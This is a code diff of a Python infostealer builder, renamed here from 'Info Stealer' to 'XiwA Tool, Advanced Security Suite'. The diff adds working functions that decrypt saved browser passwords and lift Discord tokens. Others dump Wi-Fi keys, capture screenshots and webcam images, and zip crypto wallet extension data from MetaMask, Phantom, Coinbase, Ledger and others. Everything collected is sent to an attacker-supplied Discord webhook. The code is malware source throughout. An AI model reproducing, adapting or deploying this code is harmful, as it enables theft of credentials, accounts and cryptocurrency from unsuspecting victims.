@@ -18,8 +18,6 @@ Se prohíbe estrictamente la copia, distribución o modificación no autorizada 
 XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
 """
 
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 import os
 import tkinter as tk
 from tkinter import ttk
@@ -60,20 +58,19 @@ import asyncio
 import websockets
 import http.server
 import socketserver
-import threading
 
 class InfoStealer:
     def __init__(self):
         self.root = ctk.CTk()
-        self.root.title("Info Stealer")
+        self.root.title("XiwA Tool")
         self.root.geometry("1400x1000")
-        self.root.configure(bg="#0a0a0a")
+        self.root.configure(bg="#000000")
         
         self.steal_options = {
             "Browsers": {
                 "Chrome Passwords": tk.BooleanVar(value=True),
                 "Firefox Passwords": tk.BooleanVar(value=True),
-                "Edge Passwords": tk.BooleanVar(value=True),
+                "Edge Passwords": tk.BooleanVar(value=True), 
                 "Opera Passwords": tk.BooleanVar(value=True),
                 "Brave Passwords": tk.BooleanVar(value=True),
                 "Chrome Cookies": tk.BooleanVar(value=True),
@@ -160,13 +157,12 @@ class InfoStealer:
         self.create_gui()
         
     def create_gui(self):
-        # Titre
-        self.title_frame = ctk.CTkFrame(self.root, bg_color="#0a0a0a", fg_color="#0a0a0a")
+        self.title_frame = ctk.CTkFrame(self.root, bg_color="#000000", fg_color="#000000")
         self.title_frame.pack(pady=30)
         
         self.title_label = ctk.CTkLabel(
             self.title_frame,
-            text="Info Stealer",
+            text="XiwA Tool",
             font=("Impact", 80, "bold"),
             text_color="#ff0000"
         )
@@ -174,32 +170,30 @@ class InfoStealer:
         
         self.subtitle_label = ctk.CTkLabel(
             self.title_frame,
-            text="DATA COLLECTION TOOL",
+            text="ADVANCED SECURITY SUITE",
             font=("Consolas", 24),
             text_color="#800000"
         )
         self.subtitle_label.pack(pady=10)
         
-        # Frame principal
         main_frame = ctk.CTkScrollableFrame(
             self.root,
             width=1200,
             height=600,
-            bg_color="#0a0a0a",
-            fg_color="#111111",
+            bg_color="#000000",
+            fg_color="#000000",
             border_color="#800000",
             border_width=2
         )
         main_frame.pack(pady=20, padx=20, fill="both", expand=True)
         
-        # Création des catégories
         row = 0
         col = 0
         for category, options in self.steal_options.items():
             frame = ctk.CTkFrame(
                 main_frame,
-                bg_color="#111111",
-                fg_color="#1a1a1a",
+                bg_color="#000000",
+                fg_color="#000000",
                 border_color="#800000",
                 border_width=1,
                 corner_radius=10
@@ -221,11 +215,10 @@ class InfoStealer:
                 col = 0
                 row += 1
                 
-        # Frame webhook
         webhook_frame = ctk.CTkFrame(
             self.root,
-            bg_color="#0a0a0a",
-            fg_color="#111111",
+            bg_color="#000000",
+            fg_color="#000000",
             border_color="#800000",
             border_width=2,
             corner_radius=10
@@ -237,7 +230,7 @@ class InfoStealer:
             width=900,
             height=50,
             font=("Consolas", 16),
-            fg_color="#1a1a1a",
+            fg_color="#000000",
             text_color="#ffffff",
             border_color="#800000",
             placeholder_text="Enter Discord Webhook URL..."
@@ -261,8 +254,8 @@ class InfoStealer:
     def create_checkbox(self, parent, text, variable):
         frame = ctk.CTkFrame(
             parent,
-            bg_color="#1a1a1a",
-            fg_color="#1a1a1a",
+            bg_color="#000000",
+            fg_color="#000000",
             corner_radius=5
         )
         frame.pack(fill="x", padx=10, pady=3)
@@ -342,7 +335,6 @@ import asyncio
 import websockets
 import http.server
 import socketserver
-import threading
 
 class XiwAStealer:
     def __init__(self):
@@ -378,193 +370,271 @@ class XiwAStealer:
 '''
 
     def get_steal_method(self, method_name, option_name):
-        steal_methods = {
-            "steal_chrome_passwords": '''
+        methods = {
+            'steal_chrome_passwords': '''
     def steal_chrome_passwords(self):
-        try:
-            paths = {
-                "Default": os.path.join(self.local_appdata, "Google", "Chrome", "User Data", "Default", "Login Data"),
-                "Profile 1": os.path.join(self.local_appdata, "Google", "Chrome", "User Data", "Profile 1", "Login Data"),
-                "Profile 2": os.path.join(self.local_appdata, "Google", "Chrome", "User Data", "Profile 2", "Login Data")
-            }
-            
+        paths = {
+            'Chrome': self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data',
+            'Edge': self.local_appdata + '\\\\Microsoft\\\\Edge\\\\User Data',
+            'Brave': self.local_appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data',
+            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable',
+            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable',
+        }
+        for browser, path in paths.items():
+            if not os.path.exists(path): continue
+            login_db = f"{path}\\\\Default\\\\Login Data"
+            if not os.path.exists(login_db): continue
+            temp_db = os.path.join(self.temp, f"{browser}_login_data")
+            if os.path.exists(temp_db): os.remove(temp_db)
+            shutil.copy2(login_db, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
             passwords = []
-            for profile, path in paths.items():
-                if not os.path.exists(path):
-                    continue
-                    
-                temp_path = os.path.join(self.temp, f"chrome_{profile}_data.db")
-                shutil.copy2(path, temp_path)
-                
-                conn = sqlite3.connect(temp_path)
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                
-                for row in cursor.fetchall():
-                    try:
-                        pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
-                        if pwd:
-                            passwords.append(f"URL: {row[0]}\\nUser: {row[1]}\\nPass: {pwd}\\n")
-                    except:
-                        continue
-                        
-                cursor.close()
-                conn.close()
-                os.remove(temp_path)
-                
-            self.stolen_data["Chrome Passwords"] = passwords
-        except Exception as e:
-            self.stolen_data["Chrome Passwords"] = f"Error: {str(e)}"
-''',
+            for row in cursor.fetchall():
+                try:
+                    url, username, encrypted_password = row
+                    decrypted = self.decrypt_password(encrypted_password)
+                    if url and username and decrypted:
+                        passwords.append(f"{url}|{username}|{decrypted}")
+                except: continue
+            cursor.close()
+            conn.close()
+            if passwords:
+                self.stolen_data[f'{browser} Passwords'] = passwords
+            if os.path.exists(temp_db):
+                os.remove(temp_db)''',
 
-            "steal_firefox_passwords": '''
-    def steal_firefox_passwords(self):
-        try:
-            profiles_path = os.path.join(self.roaming, "Mozilla", "Firefox", "Profiles")
-            passwords = []
-            
-            for profile in os.listdir(profiles_path):
-                db_path = os.path.join(profiles_path, profile, "logins.json")
-                if os.path.exists(db_path):
-                    with open(db_path, "r") as f:
-                        data = json.load(f)
-                        for login in data["logins"]:
-                            passwords.append(f"URL: {login['hostname']}\\nUser: {login['encryptedUsername']}\\nPass: {login['encryptedPassword']}\\n")
-                            
-            self.stolen_data["Firefox Passwords"] = passwords
-        except Exception as e:
-            self.stolen_data["Firefox Passwords"] = f"Error: {str(e)}"
-''',
-
-            "steal_discord_tokens": '''
+            'steal_discord_tokens': '''
     def steal_discord_tokens(self):
-        try:
-            paths = {
-                "Discord": os.path.join(self.roaming, "discord", "Local Storage", "leveldb"),
-                "Discord Canary": os.path.join(self.roaming, "discordcanary", "Local Storage", "leveldb"),
-                "Discord PTB": os.path.join(self.roaming, "discordptb", "Local Storage", "leveldb")
-            }
-            
-            tokens = []
-            for platform_name, path in paths.items():
-                if os.path.exists(path):
-                    for file_name in os.listdir(path):
-                        if file_name.endswith(".ldb") or file_name.endswith(".log"):
-                            with open(os.path.join(path, file_name), "r", errors="ignore") as f:
-                                for line in f.readlines():
-                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                                        for token in re.findall(regex, line):
-                                            tokens.append(f"{platform_name}: {token}\\n")
-                            
-            self.stolen_data["Discord Tokens"] = tokens
-        except Exception as e:
-            self.stolen_data["Discord Tokens"] = f"Error: {str(e)}"
-''',
+        paths = {
+            'Discord': self.roaming + '\\\\discord',
+            'Discord Canary': self.roaming + '\\\\discordcanary',
+            'Discord PTB': self.roaming + '\\\\discordptb',
+            'Google Chrome': self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
+            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable',
+            'Brave': self.local_appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
+            'Yandex': self.local_appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'
+        }
+        tokens = []
+        for source, path in paths.items():
+            if not os.path.exists(path): continue
+            path += '\\\\Local Storage\\\\leveldb'
+            for file_name in os.listdir(path):
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
+                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
+                            tokens.append(f'{source}: {token}')
+        if tokens:
+            self.stolen_data['Discord Tokens'] = tokens''',
 
-            "steal_wifi_passwords": '''
+            'steal_wifi_passwords': '''
     def steal_wifi_passwords(self):
+        networks = []
         try:
-            wifi_list = []
-            data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\\n")
+            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\\n')
             profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-            
             for profile in profiles:
                 try:
-                    results = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode("utf-8").split("\\n")
+                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\\n')
                     results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-                    wifi_list.append(f"SSID: {profile}\\nPassword: {results[0] if results else 'No Password'}\\n")
-                except:
-                    continue
-                    
-            self.stolen_data["WiFi Passwords"] = wifi_list
-        except Exception as e:
-            self.stolen_data["WiFi Passwords"] = f"Error: {str(e)}"
-''',
+                    networks.append(f'{profile}|{results[0] if results else ""}')
+                except: continue
+        except: pass
+        if networks:
+            self.stolen_data['WiFi Passwords'] = networks''',
 
-            "steal_screenshots": '''
-    def steal_screenshots(self):
+            'steal_system_info': '''
+    def steal_system_info(self):
+        info = []
+        try:
+            info.extend([
+                f"OS|{platform.system()} {platform.release()}",
+                f"Computer|{platform.node()}",
+                f"Username|{getpass.getuser()}",
+                f"CPU|{platform.processor()}",
+                f"RAM|{str(round(psutil.virtual_memory().total / (1024.0 **3)))}GB",
+                f"IP|{requests.get('https://api.ipify.org').text}",
+                f"HWID|{str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\\n')[1].strip()}"
+            ])
+        except: pass
+        if info:
+            self.stolen_data['System Info'] = info''',
+
+            'steal_screenshot': '''
+    def steal_screenshot(self):
         try:
             screenshot = pyautogui.screenshot()
             path = os.path.join(self.temp, "screenshot.png")
             screenshot.save(path)
-            with open(path, "rb") as f:
-                self.stolen_data["Screenshots"] = f.read()
+            with open(path, "rb") as image_file:
+                self.stolen_data['Screenshot'] = image_file.read()
             os.remove(path)
-        except Exception as e:
-            self.stolen_data["Screenshots"] = f"Error: {str(e)}"
-''',
+        except: pass''',
 
-            "steal_webcam_photo": '''
-    def steal_webcam_photo(self):
+            'steal_webcam': '''
+    def steal_webcam(self):
         try:
-            # Create simple HTTP server to host webcam stream
-            class StreamHandler(http.server.SimpleHTTPRequestHandler):
-                def do_GET(self):
-                    if self.path == '/':
-                        self.send_response(200)
-                        self.send_header('Content-type', 'text/html')
-                        self.end_headers()
-                        html = """
-                        <html><body style='margin:0'>
-                        <video id='v' autoplay style='width:100vw;height:100vh'></video>
-                        <script>
-                        navigator.mediaDevices.getUserMedia({video:true})
-                        .then(s=>{
-                            document.getElementById('v').srcObject=s;
-                            setTimeout(()=>{
-                                s.getTracks().forEach(t=>t.stop());
-                                window.close();
-                            },300000);
-                        });
-                        </script>
-                        </body></html>
-                        """
-                        self.wfile.write(html.encode())
-                        
-            def run_server():
-                with socketserver.TCPServer(('', 0), StreamHandler) as httpd:
-                    port = httpd.server_address[1]
-                    # Get public IP
-                    ip = requests.get('https://api.ipify.org').text
-                    # Send stream URL to webhook
-                    webhook = DiscordWebhook(url=self.webhook_url)
-                    webhook.content = f"🎥 **Live Webcam Stream**\\nURL: http://{ip}:{port}\\nStream will end in 5 minutes."
-                    webhook.execute()
-                    # Run server for 5 minutes
-                    httpd.timeout = 300
-                    httpd.handle_request()
-                    
-            server_thread = threading.Thread(target=run_server)
-            server_thread.start()
-            
-        except Exception as e:
-            print(f"Webcam stream error: {str(e)}")
-''',
+            cam = cv2.VideoCapture(0)
+            result, image = cam.read()
+            if result:
+                path = os.path.join(self.temp, "webcam.png")
+                cv2.imwrite(path, image)
+                with open(path, "rb") as image_file:
+                    self.stolen_data['Webcam'] = image_file.read()
+                os.remove(path)
+            cam.release()
+        except: pass''',
 
+            'steal_exodus_wallet': '''
+    def steal_exodus_wallet(self):
+        path = self.roaming + '\\\\Exodus\\\\exodus.wallet'
+        if os.path.exists(path):
+            try:
+                with open(path, 'rb') as wallet_file:
+                    self.stolen_data['Exodus Wallet'] = wallet_file.read()
+            except: pass''',
+
+            'steal_atomic_wallet': '''
+    def steal_atomic_wallet(self):
+        path = self.roaming + '\\\\atomic\\\\Local Storage\\\\leveldb'
+        if os.path.exists(path):
+            try:
+                zip_path = os.path.join(self.temp, "atomic.zip")
+                with zipfile.ZipFile(zip_path, 'w') as zip_file:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            zip_file.write(os.path.join(root, file))
+                with open(zip_path, 'rb') as zip_file:
+                    self.stolen_data['Atomic Wallet'] = zip_file.read()
+                os.remove(zip_path)
+            except: pass''',
+
+            'steal_metamask': '''
+    def steal_metamask(self):
+        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\nkbihfbeogaeaoehlefnkodbefgpgknn'
+        if os.path.exists(path):
+            try:
+                zip_path = os.path.join(self.temp, "metamask.zip")
+                with zipfile.ZipFile(zip_path, 'w') as zip_file:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            zip_file.write(os.path.join(root, file))
+                with open(zip_path, 'rb') as zip_file:
+                    self.stolen_data['MetaMask'] = zip_file.read()
+                os.remove(zip_path)
+            except: pass''',
+
+            'steal_phantom_wallet': '''
+    def steal_phantom_wallet(self):
+        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
+        if os.path.exists(path):
+            try:
+                zip_path = os.path.join(self.temp, "phantom.zip")
+                with zipfile.ZipFile(zip_path, 'w') as zip_file:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            zip_file.write(os.path.join(root, file))
+                with open(zip_path, 'rb') as zip_file:
+                    self.stolen_data['Phantom Wallet'] = zip_file.read()
+                os.remove(zip_path)
+            except: pass''',
+
+            'steal_binance': '''
+    def steal_binance(self):
+        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\fhbohimaelbohpjbbldcngcnapndodjp'
+        if os.path.exists(path):
+            try:
+                zip_path = os.path.join(self.temp, "binance.zip")
+                with zipfile.ZipFile(zip_path, 'w') as zip_file:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            zip_file.write(os.path.join(root, file))
+                with open(zip_path, 'rb') as zip_file:
+                    self.stolen_data['Binance'] = zip_file.read()
+                os.remove(zip_path)
+            except: pass''',
+
+            'steal_coinbase': '''
+    def steal_coinbase(self):
+        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\hnfanknocfeofbddgcijnmhnfnkdnaad'
+        if os.path.exists(path):
+            try:
+                zip_path = os.path.join(self.temp, "coinbase.zip")
+                with zipfile.ZipFile(zip_path, 'w') as zip_file:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            zip_file.write(os.path.join(root, file))
+                with open(zip_path, 'rb') as zip_file:
+                    self.stolen_data['Coinbase'] = zip_file.read()
+                os.remove(zip_path)
+            except: pass''',
+
+            'steal_trust_wallet': '''
+    def steal_trust_wallet(self):
+        path = self.local_appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings\\\\egjidjbpglichdcondbcbdnbeeppgdph'
+        if os.path.exists(path):
+            try:
+                zip_path = os.path.join(self.temp, "trustwallet.zip")
+                with zipfile.ZipFile(zip_path, 'w') as zip_file:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            zip_file.write(os.path.join(root, file))
+                with open(zip_path, 'rb') as zip_file:
+                    self.stolen_data['Trust Wallet'] = zip_file.read()
+                os.remove(zip_path)
+            except: pass''',
+
+            'steal_ledger_live': '''
+    def steal_ledger_live(self):
+        path = self.roaming + '\\\\Ledger Live'
+        if os.path.exists(path):
+            try:
+                zip_path = os.path.join(self.temp, "ledger.zip")
+                with zipfile.ZipFile(zip_path, 'w') as zip_file:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            zip_file.write(os.path.join(root, file))
+                with open(zip_path, 'rb') as zip_file:
+                    self.stolen_data['Ledger Live'] = zip_file.read()
+                os.remove(zip_path)
+            except: pass'''
         }
         
-        return steal_methods.get(method_name, f'''
+        return methods.get(method_name, f'''
     def {method_name}(self):
         try:
-            # Implement detailed data collection for {option_name}
-            self.stolen_data["{option_name}"] = "Detailed data collection implemented"
-        except Exception as e:
-            self.stolen_data["{option_name}"] = f"Error: {{str(e)}}"
+            data = []
+            if data:
+                self.stolen_data["{option_name}"] = data
+        except: pass
 ''')
 
     def get_startup_code(self):
         return '''
+    def decrypt_password(self, encrypted_password):
+        try:
+            buffer = encrypted_password[3:15]
+            encrypted_password = encrypted_password[15:]
+            cipher = AES.new(buffer, AES.MODE_GCM, buffer)
+            decrypted_pass = cipher.decrypt(encrypted_password)[:-16].decode()
+            return decrypted_pass
+        except:
+            try:
+                return str(CryptUnprotectData(encrypted_password, None, None, None, 0)[1])
+            except:
+                return ""
+
     def send_to_webhook(self):
         try:
             webhook = DiscordWebhook(url=self.webhook_url)
             
-            # Create main embed with system info
             embed = DiscordEmbed(
                 title=":computer: System Information",
                 color=0x2b2d31
             )
             
-            # Add system info with emojis
             system_info = ""
             system_info += f":windows: OS: {self.system_info['os']}\\n"
             system_info += f":cpu: CPU: {self.system_info['cpu']}\\n"
@@ -575,7 +645,6 @@ class XiwAStealer:
             
             embed.add_embed_field(name="System Details", value=system_info, inline=False)
             
-            # Add stolen data by category
             categories = {
                 ":chrome: Browsers": ["Chrome", "Firefox", "Edge", "Opera", "Brave"],
                 ":speech_balloon: Applications": ["Discord", "Telegram", "WhatsApp", "Signal", "Teams"],
@@ -602,7 +671,6 @@ class XiwAStealer:
             webhook.add_embed(embed)
             webhook.execute()
             
-            # Send detailed data in separate messages
             for key, value in self.stolen_data.items():
                 if isinstance(value, list) and value:
                     detailed_webhook = DiscordWebhook(url=self.webhook_url)
@@ -625,7 +693,6 @@ class XiwAStealer:
             
     def run(self):
         try:
-            # Create and start threads for each steal method
             threads = []
             for method_name in dir(self):
                 if method_name.startswith("steal_"):
@@ -633,11 +700,9 @@ class XiwAStealer:
                     threads.append(t)
                     t.start()
                     
-            # Wait for all threads to complete
             for thread in threads:
                 thread.join()
                 
-            # Send data to webhook
             self.send_to_webhook()
             
         except Exception as e:
